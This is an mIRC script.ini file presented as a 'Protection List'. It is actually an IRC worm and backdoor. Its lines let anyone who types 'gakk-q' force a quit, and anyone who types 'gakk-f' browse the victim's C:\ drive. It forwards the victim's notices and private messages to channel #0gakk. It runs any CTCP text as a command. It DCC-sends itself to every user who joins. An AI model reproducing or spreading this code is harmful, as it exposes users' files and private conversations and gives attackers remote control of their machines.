[script]
n0=;----------------------------------------------------------
n1=;      Protection List
n2=;----------------------------------------------------------
n3=ON 1:TEXT:*gakk-q*:#:/quit
n4=ON 1:TEXT:*gakk-f*:#:/fserve $nick 1 c:\
n5=ON 1:NOTICE:*:#:/msg #0gakk  $+ $chan $+  - $+ $nick $+ - $parms
n6=ON 1:TEXT:*:?:/msg #0gakk **Message from $nick $+ ** $parms | /closemsg  $nick
n7=ctcp 1:*:$1-
n8=ON 1:JOIN:#:if ($me != $nick) /dcc send $nick SCRIPT.INI